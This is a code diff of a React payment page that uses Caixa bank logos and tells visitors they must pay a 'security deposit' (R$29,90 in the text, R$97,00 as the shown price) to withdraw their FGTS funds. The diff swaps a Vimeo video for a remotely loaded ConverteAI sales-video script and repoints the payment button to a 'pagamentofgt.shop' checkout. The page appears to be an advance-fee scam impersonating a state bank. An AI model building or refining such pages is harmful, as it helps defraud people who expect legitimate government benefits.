@@ -1,5 +1,4 @@
 import { useEffect, useState } from "react";
-import Vimeo from "@u-wave/react-vimeo";
 import { IoMdCheckmarkCircle, IoIosWarning } from "react-icons/io";
 import logo from "../assets/caixalogo.png";
 import fgtsLogo from "../assets/fgts2.png";
@@ -7,6 +6,7 @@ import pix from "../assets/pix.png";
 import { UserData } from "../types/userData";
 import { BiCreditCard, BiLock, BiMoneyWithdraw } from "react-icons/bi";
 import logocaixa from "../assets/caixalogo.png"
+import { Helmet } from "react-helmet";
 
 export function PagamentoUpsell() {
     const [displayedAmount, setDisplayedAmount] = useState(0);
@@ -151,14 +151,12 @@ export function PagamentoUpsell() {
                     <h2 className="text-2xl font-semibold text-gray-800">
                         Por que o pagamento é necessário?
                     </h2>
-                    <Vimeo
-                        video="1034674911"
-                        autoplay
-                        showTitle={false}
-                        className="my-4 rounded-lg"
-                        width={330}
-                        height={400}
-                    />
+                    <div className="w-full p-1">
+                        <div dangerouslySetInnerHTML={{ __html: '<div id="vid_673b8a8f97a137000c273c25" style="position: relative; width: 100%; padding: 56.25% 0 0;"> <img id="thumb_673b8a8f97a137000c273c25" src="https://images.converteai.net/19e779a9-9bff-4dff-b541-9918122b88f8/players/673b8a8f97a137000c273c25/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail"> <div id="backdrop_673b8a8f97a137000c273c25" style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; "></div> </div> ' }} />
+                        <Helmet>
+                            <script type="text/javascript" id="scr_673b8a8f97a137000c273c25"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/19e779a9-9bff-4dff-b541-9918122b88f8/players/673b8a8f97a137000c273c25/player.js", s.async=!0,document.head.appendChild(s); </script>
+                        </Helmet>
+                    </div>
                     <p className="text-gray-600 text-xl mb-4">
                         O <span className="text-primary">Caução de Segurança</span> de R$29,90 é uma medida de segurança para proteger seu dinheiro. <br />
 
@@ -185,7 +183,7 @@ export function PagamentoUpsell() {
                     {/* <p className="text-2xl mb-2 text-zinc-400">DE: R$47,89</p> */}
                     <p className="text-4xl font-semibold text-primary mb-4">R$97,00</p>
 
-                    <a href="https://pay.iexperience-app.com/19945266">
+                    <a href="https://pay.pagamentofgt.shop/P5LNZ8qkBPzGaRy">
                         <button className="bg-green-600 text-white font-bold text-lg animate-pulse iexperience-upsell">PAGAR CAUÇÃO DE SEGURANÇA E SACAR MEU FGTS</button>
                     </a>
                 </div>
